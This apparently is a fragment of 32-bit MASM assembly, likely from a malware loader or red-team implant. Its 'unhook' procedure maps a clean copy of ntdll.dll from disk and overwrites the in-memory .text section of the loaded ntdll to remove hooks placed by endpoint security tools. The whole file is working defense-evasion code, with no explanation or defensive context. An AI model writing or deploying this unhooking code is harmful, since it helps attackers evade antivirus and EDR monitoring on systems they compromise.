
unhook PROTO

.CODE
CopyMemory PROC uses edi esi ecx dest:DWORD, src:DWORD, len:DWORD
    mov edi, dest
    mov esi, src
    mov ecx, len
    rep movsb
    ret
CopyMemory ENDP

unhook PROC uses eax ebx esi edi
    LOCAL baseAddr:DWORD
    LOCAL fileHandle:HANDLE
    LOCAL mappingHandle:HANDLE
    LOCAL moduleHandle:DWORD
    LOCAL moduleInfo:MODULEINFO
    LOCAL mappingAddress:DWORD
    LOCAL headerAddr:DWORD
    LOCAL dosHeaderAddr:DWORD
    LOCAL numSections:WORD
    LOCAL sectionOffset:DWORD
    LOCAL virtAddr:DWORD
    LOCAL virtSize:DWORD
    LOCAL procHandle:HANDLE
    LOCAL oldProtect:DWORD
    LOCAL virtAddrMapped:DWORD
    invoke lstrcmp, addr unhook_check, addr sz_unhook_check
	.if eax == -1
    	ret
	.endif

    invoke GetModuleHandle, addr ntdll
    mov moduleHandle, eax
    
    invoke GetCurrentProcess
    mov procHandle, eax
    
    invoke GetModuleInformation, procHandle, moduleHandle, addr moduleInfo, sizeof moduleInfo
    mov eax, moduleInfo.lpBaseOfDll
    mov baseAddr, eax

    invoke CreateFileA, addr path_ntdll, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL
    mov fileHandle, eax
    
    invoke CreateFileMappingA, fileHandle, NULL, PAGE_READONLY or SEC_IMAGE, 0, 0, NULL
    mov mappingHandle, eax
    
    invoke MapViewOfFile, mappingHandle, FILE_MAP_READ, 0, 0, 0
    mov mappingAddress, eax
    

    mov ebx, mappingAddress
    mov eax, [ebx + 3Ch]             
    add ebx, eax                    
    mov headerAddr, ebx
    
    lea eax, [ebx + 0F8h]           
    mov sectionOffset, eax
    
    movzx eax, word ptr [ebx + 6]    ; Number of sections
    mov numSections, ax
    
    ; Process .text section
    mov esi, sectionOffset
    mov eax, [esi + 0Ch]            ; VirtualAddress
    add eax, baseAddr
    mov virtAddr, eax
    
    mov eax, [esi + 8]              ; VirtualSize
    mov virtSize, eax
    
    mov eax, [esi + 0Ch]            ; VirtualAddress
    add eax, mappingAddress
    mov virtAddrMapped, eax
    
    invoke VirtualProtect, virtAddr, virtSize, PAGE_EXECUTE_READWRITE, addr oldProtect
    
    invoke CopyMemory, virtAddr, virtAddrMapped, virtSize
    
    invoke VirtualProtect, virtAddr, virtSize, oldProtect, addr oldProtect

    
    ret
unhook ENDP

